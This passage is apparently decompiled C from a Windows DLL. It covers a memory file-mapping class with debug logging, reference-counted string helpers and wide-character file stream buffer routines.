     (iVar4 = FUN_1004b5c0(&DAT_10086aa0,3), iVar4 != -1)) {
    local_8 = CONCAT31(local_8._1_3_,3);
    uVar8 = FUN_10059ab0();
    piVar5 = (int *)FUN_10022970(uVar8,extraout_ECX);
    local_6c = piVar5;
    if ((param_1[3] != 0) && (param_1[3] != -0xc)) {
      FUN_100106a0(&local_6c,1);
    }
    local_8._0_1_ = 2;
    if (piVar5 != (int *)0x0) {
      LOCK();
      iVar4 = *piVar5;
      *piVar5 = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(piVar5);
      }
    }
  }
  piVar5 = (int *)FUN_1000ae10(&local_74);
  if (*piVar5 == 0) {
    iVar4 = 0;
  }
  else {
    iVar4 = *piVar5 + 0xc;
  }
  iVar4 = FUN_10006250("CMemFileMapping: %s\n",iVar4);
  if (local_74 != (int *)0x0) {
    LOCK();
    iVar2 = *local_74;
    iVar4 = *local_74;
    *local_74 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      iVar4 = FUN_100579ee(local_74);
    }
  }
  if (*param_1 != 0) goto LAB_100276a2;
  iVar4 = FUN_1059fccb();
  *param_1 = iVar4;
  pcVar6 = (code *)FUN_105d6aa2(iVar4,in_stack_ffffc20c,in_stack_ffffc210);
  piVar5 = extraout_ECX_00;
  if (pcVar6 != (code *)0x0) {
    if (((pcVar6 == (code *)0x5) || (pcVar6 == (code *)0x2)) ||
       (piVar5 = extraout_ECX_00, pcVar6 == (code *)0x538)) {
      piVar5 = (int *)FUN_1000ae10(local_60);
      if (*piVar5 == 0) {
        iVar4 = 0;
      }
      else {
        iVar4 = *piVar5 + 0xc;
      }
      FUN_10006250("keep trying OpenFileMapping() on \'%s\'\n",iVar4);
      if (local_60[0] != (int *)0x0) {
        LOCK();
        iVar4 = *local_60[0];
        *local_60[0] = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_60[0]);
        }
      }
      FUN_10443a94();
      local_60[0] = (int *)(*pcVar6)();
      do {
        uVar8 = (*DAT_10079310)(100);
        iVar4 = param_1[3];
        if ((iVar4 == 0) || (*(int *)(iVar4 + 8) == 0)) {
          ppuVar7 = &PTR_10083554;
        }
        else if (iVar4 == 0) {
          ppuVar7 = (undefined **)0x0;
        }
        else {
          ppuVar7 = (undefined **)(iVar4 + 0xc);
        }
        iVar4 = FUN_100ecc57(uVar8,6,0,ppuVar7);
        *param_1 = iVar4;
        uVar8 = extraout_ECX_01;
      } while ((iVar4 == 0) &&
              (iVar4 = (*pcVar6)(), uVar8 = extraout_ECX_02,
              (uint)(iVar4 - (int)local_60[0]) < 0x1d4c1));
      pcVar6 = (code *)FUN_101ae5bc(uVar8);
      param_1[4] = 0;
      piVar5 = extraout_ECX_03;
    }
    if (pcVar6 == (code *)0xb7) {
      piVar5 = (int *)FUN_1000ae10(&local_70);
      if (*piVar5 == 0) {
        iVar4 = 0;
      }
      else {
        iVar4 = *piVar5 + 0xc;
      }
      FUN_10006250("CreateFileMapping: opening already existing file-mapping \'%s\'\n",iVar4);
      if (local_70 != (int *)0x0) {
        LOCK();
        iVar4 = *local_70;
        *local_70 = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_70);
        }
      }
      param_1[4] = 0;
    }
    else if (pcVar6 == (code *)0x0) goto LAB_10027681;
    FUN_1001e780(pcVar6);
    local_8 = CONCAT31(local_8._1_3_,4);
    piVar5 = (int *)FUN_1000ae10(&local_64);
    if (*piVar5 == 0) {
      iVar4 = 0;
    }
    else {
      iVar4 = *piVar5 + 0xc;
    }
    FUN_10006250("CreateFileMapping error: \'%s\'\n",iVar4);
    if (local_64 != (int *)0x0) {
      LOCK();
      iVar4 = *local_64;
      *local_64 = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(local_64);
      }
    }
    local_8._0_1_ = 2;
    piVar5 = local_80;
    if (local_80 != (int *)0x0) {
      LOCK();
      iVar4 = *local_80;
      *local_80 = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(local_80);
        piVar5 = extraout_ECX_04;
      }
    }
  }
LAB_10027681:
  if (param_1[3] == 0) {
    iVar4 = 0;
  }
  else {
    iVar4 = param_1[3] + 0xc;
  }
  iVar4 = FUN_10482b17(piVar5,iVar4,6,4,0,0,0,0);
LAB_100276a2:
  iVar4 = FUN_10333249(iVar4,*param_1,6,0,0,0x478);
  param_1[5] = iVar4;
  if (iVar4 == 0) {
    piVar5 = (int *)FUN_1000ae10(&local_68);
    if (*piVar5 == 0) {
      iVar4 = 0;
    }
    else {
      iVar4 = *piVar5 + 0xc;
    }
    FUN_10006250("zombie: CMemFileMapping failed on %s\n",iVar4);
    if (local_68 != (int *)0x0) {
      LOCK();
      iVar4 = *local_68;
      *local_68 = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(local_68);
      }
    }
  }
  else if (param_1[4] == 0) {
    *(int **)(iVar4 + 0x10) = (int *)(iVar4 + 0x18);
    *(int *)(iVar4 + 0x18) = iVar4 + 0x20;
    *(int *)(iVar4 + 0x1c) = iVar4 + 0x74;
  }
  else {
    FUN_10023b50();
  }
  if ((local_50 != local_58) && (local_58 != (undefined1 *)0x0)) {
    (*DAT_10079288)(local_58);
  }
  if ((((local_24 == 0) || (local_1c == 0)) || (piVar5 = local_3c, local_3c == (int *)0x0)) &&
     ((piVar5 = param_1, DAT_10079270 != (code *)0x0 && (local_3c != (int *)0x0)))) {
    (*DAT_10079270)(local_3c);
  }
  FUN_10542ab1(piVar5,0,local_34,0,0,0);
  ExceptionList = (void *)(*(int *)(unaff_EBX + 0xd8bc845) * 0x70);
  *(undefined1 *)(unaff_EBX + 0x50 + extraout_EDX) = 0;
  puVar1 = (uint *)(unaff_EBX + -0xbb27439);
  *puVar1 = *puVar1 >> 1 | (uint)((*puVar1 & 1) != 0) << 0x1f;
  FUN_100579df();
  return;
}



/* Function: FUN_10027790 */

void __fastcall FUN_10027790(undefined4 *param_1)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075f3b;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_8 = 0;
  piVar2 = (int *)FUN_1000ae10(&local_14);
  if (*piVar2 == 0) {
    iVar3 = 0;
  }
  else {
    iVar3 = *piVar2 + 0xc;
  }
  FUN_10006250("~CMemFileMapping: %s\n",iVar3,uVar1);
  if (local_14 != (int *)0x0) {
    LOCK();
    iVar3 = *local_14;
    *local_14 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(local_14);
    }
  }
  if (param_1[5] != 0) {
    FUN_1055c3ad();
  }
  param_1[5] = 0;
  (*DAT_10079270)(*param_1);
  piVar2 = (int *)param_1[3];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar3 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_10027850 */

int __fastcall FUN_10027850(int *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  int iVar3;
  int *local_8;
  
  local_8 = (int *)0x5c;
  iVar1 = FUN_10010c00();
  if (*param_1 == 0) {
    iVar3 = 0;
  }
  else {
    iVar3 = *(int *)(*param_1 + 8);
  }
  iVar3 = iVar3 - (iVar1 + 1);
  if (iVar3 != 0) {
    puVar2 = (undefined4 *)FUN_1000e640(&local_8,iVar1 + 1,iVar3);
    iVar1 = FUN_10010440(*puVar2);
    *param_1 = iVar1;
    if (local_8 != (int *)0x0) {
      LOCK();
      iVar1 = *local_8;
      *local_8 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(local_8);
      }
    }
  }
  if (*param_1 != 0) {
    return *param_1 + 0xc;
  }
  return 0;
}



/* Function: FUN_100278c0 */

undefined4 __fastcall FUN_100278c0(int param_1,undefined4 param_2,undefined4 param_3)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  undefined4 in_stack_ffffff24;
  undefined4 in_stack_ffffff28;
  undefined4 in_stack_ffffff2c;
  int aiStack_c4 [15];
  int aiStack_88 [7];
  int local_6c;
  undefined **local_60 [20];
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075f6b;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  FUN_10027bf0(param_3,in_stack_ffffff24,in_stack_ffffff28,in_stack_ffffff2c);
  local_8 = 0;
  if (local_6c == 0) {
    uVar4 = 0;
  }
  else {
    if (param_1 != 0) {
      (**(code **)(aiStack_c4[2] + 0x24))(param_1,param_2,0,uVar1);
    }
    FUN_10026f20();
    iVar2 = FUN_10028790();
    if (iVar2 == 0) {
      iVar2 = *(int *)(aiStack_c4[1] + 4);
      uVar1 = *(uint *)((int)aiStack_c4 + iVar2 + 0x10);
      uVar3 = uVar1 | 2;
      if (*(int *)((int)aiStack_88 + iVar2) == 0) {
        uVar3 = uVar1 | 6;
      }
      *(uint *)((int)aiStack_c4 + iVar2 + 0x10) = uVar3 & 0x17;
      if ((*(uint *)((int)aiStack_c4 + iVar2 + 0x14) & uVar3 & 0x17) != 0) {
        FUN_10008c40();
      }
    }
    uVar4 = 1;
  }
  local_8 = 0xffffffff;
  *(undefined ***)((int)aiStack_c4 + *(int *)(aiStack_c4[1] + 4) + 4) = &PTR_DAT_10086df0;
  *(int *)((int)aiStack_c4 + *(int *)(aiStack_c4[1] + 4)) = *(int *)(aiStack_c4[1] + 4) + -0x60;
  FUN_10027ce0();
  *(undefined ***)((int)aiStack_c4 + *(int *)(aiStack_c4[1] + 4) + 4) =
       std::basic_ostream<wchar_t,struct_std::char_traits<wchar_t>_>::vftable;
  *(int *)((int)aiStack_c4 + *(int *)(aiStack_c4[1] + 4)) = *(int *)(aiStack_c4[1] + 4) + -8;
  local_60[0] = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)local_60);
  ExceptionList = local_10;
  return uVar4;
}



/* Function: FUN_10027a00 */

undefined4 * __thiscall FUN_10027a00(undefined4 *param_1,char *param_2)

{
  undefined4 uVar1;
  
  if ((param_2 != (char *)0x0) && (*param_2 == '\0')) {
    uVar1 = FUN_10007ae0();
    *param_1 = uVar1;
    return param_1;
  }
  uVar1 = FUN_100075b0();
  *param_1 = uVar1;
  return param_1;
}



/* Function: FUN_10027a40 */

int __fastcall FUN_10027a40(int *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 local_8;
  
  local_8 = (int *)CONCAT22((short)((uint)param_1 >> 0x10),0x5c);
  iVar1 = FUN_10010d00();
  if (*param_1 == 0) {
    iVar3 = 0;
  }
  else {
    iVar3 = *(int *)(*param_1 + 8);
  }
  iVar3 = iVar3 - (iVar1 + 1);
  if (iVar3 != 0) {
    puVar2 = (undefined4 *)FUN_1000e760(&local_8,iVar1 + 1,iVar3);
    iVar1 = FUN_10007010(*puVar2);
    *param_1 = iVar1;
    if (local_8 != (int *)0x0) {
      LOCK();
      iVar1 = *local_8;
      *local_8 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(local_8);
      }
    }
  }
  if (*param_1 != 0) {
    return *param_1 + 0xc;
  }
  return 0;
}



/* Function: FUN_10027ab0 */

void __thiscall FUN_10027ab0(int *param_1,undefined4 *param_2,undefined4 *param_3)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined8 uVar5;
  uint uStack_28;
  int *local_18;
  undefined1 *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075f90;
  local_10 = ExceptionList;
  uStack_28 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_14 = (undefined1 *)&uStack_28;
  ExceptionList = &local_10;
  puVar4 = *(undefined4 **)*param_1;
  local_8 = 0;
  local_18 = param_1;
  for (; param_2 != param_3; param_2 = (undefined4 *)*param_2) {
    if (puVar4 == (undefined4 *)*param_1) goto LAB_10027b11;
    FUN_10028cb0(puVar4,param_2 + 2);
    puVar4 = (undefined4 *)*puVar4;
  }
LAB_10027b69:
  FUN_10020e00(&local_18,puVar4,*param_1);
  ExceptionList = local_10;
  return;
LAB_10027b11:
  for (; param_2 != param_3; param_2 = (undefined4 *)*param_2) {
    iVar1 = *param_1;
    uVar2 = FUN_10011570(iVar1,*(undefined4 *)(iVar1 + 4),param_2 + 2);
    uVar5 = CONCAT44(uVar2,param_1[1]);
    if (param_1[1] == 0x15555554) {
      uVar5 = FUN_10056a6a("list<T> too long");
    }
    iVar3 = (int)((ulonglong)uVar5 >> 0x20);
    param_1[1] = (int)uVar5 + 1;
    *(int *)(iVar1 + 4) = iVar3;
    **(int **)(iVar3 + 4) = iVar3;
  }
  goto LAB_10027b69;
}



/* Function: Catch_All@10027b58 */

void Catch_All_10027b58(void)

{
  undefined4 *unaff_EBX;
  int unaff_EBP;
  undefined4 unaff_ESI;
  
  FUN_1000ba10();
  FUN_1005de1b(0,0);
  FUN_10020e00(unaff_EBP + -0x14,unaff_ESI,*unaff_EBX);
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



/* Function: FUN_10027b90 */

void __fastcall FUN_10027b90(int *param_1)

{
  ios_base *piVar1;
  
  piVar1 = (ios_base *)(param_1 + 0x18);
  *(undefined ***)(piVar1 + *(int *)(*param_1 + 4) + -0x60) = &PTR_DAT_10086df0;
  *(int *)(piVar1 + *(int *)(*param_1 + 4) + -100) = *(int *)(*param_1 + 4) + -0x60;
  FUN_10027ce0();
  *(undefined ***)(piVar1 + *(int *)(*param_1 + 4) + -0x60) =
       std::basic_ostream<wchar_t,struct_std::char_traits<wchar_t>_>::vftable;
  *(int *)(piVar1 + *(int *)(*param_1 + 4) + -100) = *(int *)(*param_1 + 4) + -8;
  *(undefined ***)piVar1 = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor(piVar1);
  return;
}



/* Function: FUN_10027bf0 */

int * __thiscall FUN_10027bf0(int *param_1,undefined4 param_2)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  undefined4 uVar5;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075fe2;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = (int)&DAT_10086df4;
  param_1[0x18] = (int)std::basic_ios<wchar_t,struct_std::char_traits<wchar_t>_>::vftable;
  local_8 = 0;
  *(undefined ***)((int)param_1 + *(int *)(*param_1 + 4)) =
       std::basic_ostream<wchar_t,struct_std::char_traits<wchar_t>_>::vftable;
  iVar3 = *(int *)(*param_1 + 4);
  *(int *)(iVar3 + -4 + (int)param_1) = iVar3 + -8;
  FUN_10028ac0(param_1 + 1,iVar3);
  local_8 = 2;
  *(undefined ***)((int)param_1 + *(int *)(*param_1 + 4)) = &PTR_DAT_10086df0;
  iVar3 = *(int *)(*param_1 + 4);
  *(int *)(iVar3 + -4 + (int)param_1) = iVar3 + -0x60;
  uVar5 = 0x10027c8e;
  FUN_10028640(iVar3);
  local_8 = CONCAT31(local_8._1_3_,3);
  iVar3 = FUN_100286d0(param_2,uVar5,iVar3);
  if (iVar3 == 0) {
    iVar3 = *(int *)(*param_1 + 4);
    uVar1 = *(uint *)(iVar3 + 0xc + (int)param_1);
    uVar4 = uVar1 | 2;
    if (*(int *)((int)param_1 + iVar3 + 0x38) == 0) {
      uVar4 = uVar1 | 6;
    }
    *(uint *)((int)param_1 + iVar3 + 0xc) = uVar4 & 0x17;
    if ((*(uint *)((int)param_1 + iVar3 + 0x10) & uVar4 & 0x17) != 0) {
      FUN_10008c40(uVar2);
    }
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10027ce0 */

void __fastcall FUN_10027ce0(undefined4 *param_1)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  undefined4 *puVar4;
  
  *param_1 = std::basic_filebuf<wchar_t,struct_std::char_traits<wchar_t>_>::vftable;
  if ((param_1[0x14] != 0) && (*(undefined4 **)param_1[3] == param_1 + 0x11)) {
    iVar1 = param_1[0xf];
    iVar2 = param_1[0xe];
    *(int *)param_1[3] = iVar2;
    *(int *)param_1[7] = iVar2;
    *(int *)param_1[0xb] = iVar1 - iVar2 >> 1;
  }
  if (*(char *)(param_1 + 0x13) != '\0') {
    FUN_10028790();
  }
  *param_1 = vftable;
  piVar3 = (int *)param_1[0xd];
  if (piVar3 != (int *)0x0) {
    if ((int *)*piVar3 != (int *)0x0) {
      puVar4 = (undefined4 *)(**(code **)(*(int *)*piVar3 + 8))();
      if (puVar4 != (undefined4 *)0x0) {
        (**(code **)*puVar4)(1);
      }
    }
    thunk_FUN_100579ee(piVar3);
  }
  return;
}



/* Function: FUN_10027d50 */

/* WARNING: Removing unreachable block (ram,0x10027e4e) */

void __thiscall FUN_10027d50(int param_1,uint param_2)

{
  uint uVar1;
  short *psVar2;
  uint uVar3;
  int iVar4;
  undefined8 *puVar5;
  int iVar6;
  undefined8 *puVar7;
  undefined1 auStack_44 [4];
  undefined4 local_40;
  int local_3c;
  undefined4 *local_38;
  undefined8 local_34;
  undefined1 local_2c;
  uint local_24;
  uint local_20;
  uint local_1c;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 local_c;
  
  local_c = 0xffffffff;
  puStack_10 = &LAB_10074ae8;
  local_14 = ExceptionList;
  local_1c = DAT_100956e0 ^ (uint)auStack_44;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xffffffb0;
  ExceptionList = &local_14;
  if ((short)param_2 != -1) {
    uVar1 = **(uint **)(param_1 + 0x20);
    if (uVar1 != 0) {
      iVar4 = **(int **)(param_1 + 0x30);
      if (uVar1 < uVar1 + iVar4 * 2) {
        **(int **)(param_1 + 0x30) = iVar4 + -1;
        psVar2 = (short *)**(int **)(param_1 + 0x20);
        **(int **)(param_1 + 0x20) = (int)(psVar2 + 1);
        *psVar2 = (short)param_2;
        goto LAB_10027f9a;
      }
    }
    if (*(int *)(param_1 + 0x50) != 0) {
      if (**(int **)(param_1 + 0xc) == param_1 + 0x44) {
        iVar4 = *(int *)(param_1 + 0x3c);
        iVar6 = *(int *)(param_1 + 0x38);
        **(int **)(param_1 + 0xc) = iVar6;
        **(int **)(param_1 + 0x1c) = iVar6;
        **(int **)(param_1 + 0x2c) = iVar4 - iVar6 >> 1;
      }
      if (*(int *)(param_1 + 0x40) == 0) {
        FUN_1005ad34(param_2,*(undefined4 *)(param_1 + 0x50),uVar3);
      }
      else {
        local_40 = param_2 & 0xffff;
        local_34 = 0;
        local_20 = 0xf;
        local_24 = 8;
        local_2c = 0;
        local_c = 0;
        while( true ) {
          puVar5 = &local_34;
          if (0xf < local_20) {
            puVar5 = (undefined8 *)local_34;
          }
          puVar7 = &local_34;
          if (0xf < local_20) {
            puVar7 = (undefined8 *)local_34;
          }
          iVar4 = (**(code **)(**(int **)(param_1 + 0x40) + 0x1c))
                            (param_1 + 0x48,&local_40,(int)&local_40 + 2,&local_38,puVar7,
                             local_24 + (int)puVar5,&local_3c);
          if (iVar4 < 0) goto LAB_10027f84;
          if (1 < iVar4) break;
          puVar5 = &local_34;
          if (0xf < local_20) {
            puVar5 = (undefined8 *)local_34;
          }
          iVar4 = local_3c - (int)puVar5;
          if (iVar4 != 0) {
            puVar5 = &local_34;
            if (0xf < local_20) {
              puVar5 = (undefined8 *)local_34;
            }
            iVar6 = FUN_10059d85(puVar5,1,iVar4,*(undefined4 *)(param_1 + 0x50));
            if (iVar4 != iVar6) goto LAB_10027f84;
          }
          *(undefined1 *)(param_1 + 0x46) = 1;
          if (local_38 != &local_40) goto LAB_10027f84;
          if (iVar4 == 0) {
            if (0x1f < local_24) goto LAB_10027f84;
            FUN_10012870(8,0);
          }
        }
        if (iVar4 == 3) {
          FUN_100245e0();
        }
LAB_10027f84:
        if (0xf < local_20) {
          thunk_FUN_100579ee((undefined8 *)local_34);
        }
      }
    }
  }
LAB_10027f9a:
  ExceptionList = local_14;
  FUN_100579df();
  return;
}



/* Function: FUN_10027fc0 */

uint __thiscall FUN_10027fc0(int param_1,uint param_2)

{
  uint uVar1;
  short sVar2;
  short sVar3;
  
  uVar1 = **(uint **)(param_1 + 0x1c);
  sVar3 = (short)param_2;
  if (((uVar1 != 0) && (**(uint **)(param_1 + 0xc) < uVar1)) &&
     ((sVar3 == -1 || (*(short *)(uVar1 - 2) == sVar3)))) {
    **(int **)(param_1 + 0x2c) = **(int **)(param_1 + 0x2c) + 1;
    **(int **)(param_1 + 0x1c) = **(int **)(param_1 + 0x1c) + -2;
    if (sVar3 != -1) {
      return param_2 & 0xffff;
    }
    return 0;
  }
  if ((*(int *)(param_1 + 0x50) != 0) && (sVar3 != -1)) {
    if (*(int *)(param_1 + 0x40) == 0) {
      sVar2 = FUN_1005b368(param_2,*(int *)(param_1 + 0x50));
      if (sVar2 != -1) goto LAB_10028043;
    }
    if ((short *)**(int **)(param_1 + 0x1c) != (short *)(param_1 + 0x44)) {
      *(short *)(param_1 + 0x44) = sVar3;
      Set_back();
LAB_10028043:
      return param_2 & 0xffff;
    }
  }
  return 0xffff;
}



/* Function: FUN_10028060 */

short __fastcall FUN_10028060(int *param_1)

{
  short *psVar1;
  short sVar2;
  short sVar3;
  
  psVar1 = *(short **)param_1[7];
  if ((psVar1 != (short *)0x0) && (psVar1 < psVar1 + *(int *)param_1[0xb])) {
    return *psVar1;
  }
  sVar2 = (**(code **)(*param_1 + 0x1c))();
  sVar3 = -1;
  if (sVar2 != -1) {
    (**(code **)(*param_1 + 0x10))(sVar2);
    sVar3 = sVar2;
  }
  return sVar3;
}



/* Function: FUN_100280a0 */

void __fastcall FUN_100280a0(int param_1)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  undefined4 ******ppppppuVar5;
  undefined4 ******ppppppuVar6;
  undefined1 auStack_44 [4];
  undefined1 local_40 [2];
  undefined1 local_3e [2];
  int local_3c;
  undefined1 *local_38;
  undefined4 *****local_34 [4];
  uint local_24;
  uint local_20;
  uint local_1c;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 local_c;
  
  local_c = 0xffffffff;
  puStack_10 = &LAB_10074ae8;
  local_14 = ExceptionList;
  local_1c = DAT_100956e0 ^ (uint)auStack_44;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xffffffb0;
  ExceptionList = &local_14;
  uVar1 = **(uint **)(param_1 + 0x1c);
  if (uVar1 != 0) {
    iVar4 = **(int **)(param_1 + 0x2c);
    if (uVar1 < uVar1 + iVar4 * 2) {
      **(int **)(param_1 + 0x2c) = iVar4 + -1;
      **(int **)(param_1 + 0x1c) = **(int **)(param_1 + 0x1c) + 2;
      goto LAB_1002827e;
    }
  }
  if (*(int *)(param_1 + 0x50) != 0) {
    if (**(int **)(param_1 + 0xc) == param_1 + 0x44) {
      iVar4 = *(int *)(param_1 + 0x3c);
      iVar2 = *(int *)(param_1 + 0x38);
      **(int **)(param_1 + 0xc) = iVar2;
      **(int **)(param_1 + 0x1c) = iVar2;
      **(int **)(param_1 + 0x2c) = iVar4 - iVar2 >> 1;
    }
    if (*(int *)(param_1 + 0x40) != 0) {
      local_20 = 0xf;
      local_24 = 0;
      local_34[0] = (undefined4 *****)((uint)local_34[0] & 0xffffff00);
      local_c = 0;
      iVar4 = FUN_10059766(*(undefined4 *)(param_1 + 0x50),uVar3);
      do {
        if (iVar4 == -1) goto LAB_10028268;
        FUN_10012870(1,iVar4);
        ppppppuVar5 = local_34;
        if (0xf < local_20) {
          ppppppuVar5 = (undefined4 ******)local_34[0];
        }
        ppppppuVar6 = local_34;
        if (0xf < local_20) {
          ppppppuVar6 = (undefined4 ******)local_34[0];
        }
        iVar4 = (**(code **)(**(int **)(param_1 + 0x40) + 0x18))
                          (param_1 + 0x48,ppppppuVar6,local_24 + (int)ppppppuVar5,&local_3c,local_40
                           ,local_3e,&local_38);
        if (iVar4 < 0) goto LAB_10028268;
        if (iVar4 < 2) {
          if (local_38 != local_40) {
            ppppppuVar5 = local_34;
            if (0xf < local_20) {
              ppppppuVar5 = (undefined4 ******)local_34[0];
            }
            for (iVar4 = (int)ppppppuVar5 + (local_24 - local_3c); 0 < iVar4; iVar4 = iVar4 + -1) {
              FUN_10059a40((int)*(char *)(iVar4 + -1 + local_3c),*(undefined4 *)(param_1 + 0x50));
            }
LAB_10028268:
            if (0xf < local_20) {
              thunk_FUN_100579ee(local_34[0]);
            }
            goto LAB_1002827e;
          }
          ppppppuVar5 = local_34;
          if (0xf < local_20) {
            ppppppuVar5 = (undefined4 ******)local_34[0];
          }
          FUN_1000b8b0(0,local_3c - (int)ppppppuVar5);
        }
        else {
          if (iVar4 != 3) goto LAB_10028268;
          if (1 < local_24) {
            ppppppuVar5 = local_34;
            if (0xf < local_20) {
              ppppppuVar5 = (undefined4 ******)local_34[0];
            }
            _memcpy_s(local_40,2,ppppppuVar5,2);
            goto LAB_10028268;
          }
        }
        iVar4 = FUN_10059766(*(undefined4 *)(param_1 + 0x50));
      } while( true );
    }
    FUN_1005ab3e(*(undefined4 *)(param_1 + 0x50));
  }
LAB_1002827e:
  ExceptionList = local_14;
  FUN_100579df();
  return;
}



/* Function: FUN_100282e0 */

void __thiscall FUN_100282e0(int param_1,undefined4 *param_2,uint param_3,int param_4,int param_5)

{
  int iVar1;
  undefined4 uVar2;
  char cVar3;
  int iVar4;
  bool bVar5;
  undefined4 local_10;
  undefined4 local_c;
  
  if (((**(int **)(param_1 + 0x1c) == param_1 + 0x44) && (param_5 == 1)) &&
     (*(int *)(param_1 + 0x40) == 0)) {
    bVar5 = 1 < param_3;
    param_3 = param_3 - 2;
    param_4 = param_4 + -1 + (uint)bVar5;
  }
  if ((((*(int *)(param_1 + 0x50) != 0) && (cVar3 = FUN_100288d0(), cVar3 != '\0')) &&
      (((param_3 == 0 && param_4 == 0 && (param_5 == 1)) ||
       (iVar4 = FUN_10059e07(*(undefined4 *)(param_1 + 0x50),param_3,param_4,param_5), iVar4 == 0)))
      ) && (iVar4 = FUN_10059f3e(*(undefined4 *)(param_1 + 0x50),&local_10), iVar4 == 0)) {
    if (**(int **)(param_1 + 0xc) == param_1 + 0x44) {
      iVar4 = *(int *)(param_1 + 0x3c);
      iVar1 = *(int *)(param_1 + 0x38);
      **(int **)(param_1 + 0xc) = iVar1;
      **(int **)(param_1 + 0x1c) = iVar1;
      **(int **)(param_1 + 0x2c) = iVar4 - iVar1 >> 1;
    }
    param_2[2] = local_10;
    param_2[3] = local_c;
    uVar2 = *(undefined4 *)(param_1 + 0x48);
    *param_2 = 0;
    param_2[1] = 0;
    param_2[4] = uVar2;
    return;
  }
  *param_2 = DAT_1007a4f8;
  param_2[1] = DAT_1007a4fc;
  param_2[2] = 0;
  param_2[3] = 0;
  param_2[4] = 0;
  return;
}



/* Function: FUN_100283f0 */

void __thiscall
FUN_100283f0(int param_1,undefined4 *param_2,int param_3,int param_4,undefined4 param_5,
            undefined4 param_6,undefined4 param_7)

{
  undefined4 uVar1;
  char cVar2;
  int iVar3;
  undefined4 local_10;
  undefined4 local_c;
  
  local_10 = param_5;
  local_c = param_6;
  if (*(int *)(param_1 + 0x50) != 0) {
    cVar2 = FUN_100288d0();
    if (cVar2 != '\0') {
      iVar3 = _fsetpos(*(FILE **)(param_1 + 0x50),(fpos_t *)&local_10);
      if (iVar3 == 0) {
        if (param_3 != 0 || param_4 != 0) {
          iVar3 = FUN_10059e07(*(undefined4 *)(param_1 + 0x50),param_3,param_4,1);
          if (iVar3 != 0) goto LAB_100284a0;
        }
        iVar3 = FUN_10059f3e(*(undefined4 *)(param_1 + 0x50),&local_10);
        if (iVar3 == 0) {
          *(undefined4 *)(param_1 + 0x48) = param_7;
          Reset_back();
          param_2[2] = local_10;
          param_2[3] = local_c;
          uVar1 = *(undefined4 *)(param_1 + 0x48);
          *param_2 = 0;
          param_2[1] = 0;
          param_2[4] = uVar1;
          return;
        }
      }
    }
  }
LAB_100284a0:
  *param_2 = DAT_1007a4f8;
  param_2[1] = DAT_1007a4fc;
  param_2[2] = 0;
  param_2[3] = 0;
  param_2[4] = 0;
  return;
}



/* Function: FUN_100284e0 */

int __thiscall FUN_100284e0(int param_1,char *param_2,int param_3,int param_4)

{
  int iVar1;
  
  if (*(FILE **)(param_1 + 0x50) != (FILE *)0x0) {
    if ((param_2 == (char *)0x0) && (param_3 == 0 && param_4 == 0)) {
      iVar1 = 4;
    }
    else {
      iVar1 = 0;
    }
    iVar1 = _setvbuf(*(FILE **)(param_1 + 0x50),param_2,iVar1,param_3 * 2);
    if (iVar1 == 0) {
      FUN_10028840(*(undefined4 *)(param_1 + 0x50),1);
      return param_1;
    }
  }
  return 0;
}



/* Function: FUN_10028540 */

undefined4 __fastcall FUN_10028540(int *param_1)

{
  short sVar1;
  int iVar2;
  
  if (param_1[0x14] != 0) {
    sVar1 = (**(code **)(*param_1 + 0xc))(0xffff);
    if (sVar1 != -1) {
      iVar2 = FUN_1005a185(param_1[0x14]);
      if (iVar2 < 0) {
        return 0xffffffff;
      }
    }
  }
  return 0;
}



/* Function: FUN_10028580 */

void FUN_10028580(undefined4 param_1)

{
  undefined4 uVar1;
  
